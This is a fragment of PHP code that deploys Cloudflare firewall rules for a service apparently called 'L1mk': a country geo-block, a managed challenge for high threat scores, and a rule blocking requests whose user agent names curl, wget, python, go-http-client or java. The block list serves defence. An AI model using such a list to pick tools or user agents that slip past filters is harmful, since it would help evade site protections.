            $list = implode(' ', array_map(function($c){ return "\"$c\""; }, $countries));
            $expression = "(not ip.geoip.country in {{$list}})";
            
            $ruleData = [
                'description' => $ruleDescription,
                'expression' => $expression,
                'action' => 'block',
                'enabled' => true
            ];

            if ($existingRuleId) {
                $cf('PATCH', "zones/$zoneId/rulesets/$rulesetId/rules/$existingRuleId", $ruleData);
            } else {
                $cf('POST', "zones/$zoneId/rulesets/$rulesetId/rules", $ruleData);
            }
        } elseif ($existingRuleId) {
            $cf('DELETE', "zones/$zoneId/rulesets/$rulesetId/rules/$existingRuleId");
        }
    }

    private static function deployWafRules($cf, $zoneId) {
        // 1. Get existing rulesets to avoid duplicates
        $rulesets = $cf('GET', "zones/$zoneId/rulesets");
        $phase = 'http_request_firewall_custom';
        $rulesetId = null;

        if ($rulesets['code'] === 200 && !empty($rulesets['body']['result'])) {
            foreach ($rulesets['body']['result'] as $rs) {
                if ($rs['phase'] === $phase && $rs['kind'] === 'zone') {
                    $rulesetId = $rs['id'];
                    break;
                }
            }
        }

        // Define our rules
        $newRules = [
            [
                'description' => 'L1mk: Block Automated Tools',
                'expression' => '(http.user_agent contains "curl") or (http.user_agent contains "python") or (http.user_agent contains "wget") or (http.user_agent contains "go-http-client") or (http.user_agent contains "java")',
                'action' => 'block',
                'enabled' => true
            ],
            [
                'description' => 'L1mk: Challenge High Risk',
                'expression' => '(cf.threat_score gt 15)',
                'action' => 'managed_challenge',
                'enabled' => true
            ]
        ];

        if ($rulesetId) {
            // Update existing ruleset (append/update)
            // For simplicity, we create them if they don't exist by description
            $existingRules = $cf('GET', "zones/$zoneId/rulesets/$rulesetId");
            $currentRules = $existingRules['body']['result']['rules'] ?? [];
            
            foreach ($newRules as $rule) {
                $exists = false;
                foreach ($currentRules as $cr) {
                    if (($cr['description'] ?? '') === $rule['description']) {
                        $exists = true;
                        break;
                    }
                }
                
                if (!$exists) {
                    $cf('POST', "zones/$zoneId/rulesets/$rulesetId/rules", $rule);
                }
            }
        } else {
            // Create new ruleset with rules
            $payload = [
                'name' => 'L1mk Custom Rules',
                'kind' => 'zone',
                'phase' => $phase,
                'rules' => $newRules
            ];
            $cf('POST', "zones/$zoneId/rulesets", $payload);
        }
    }
}
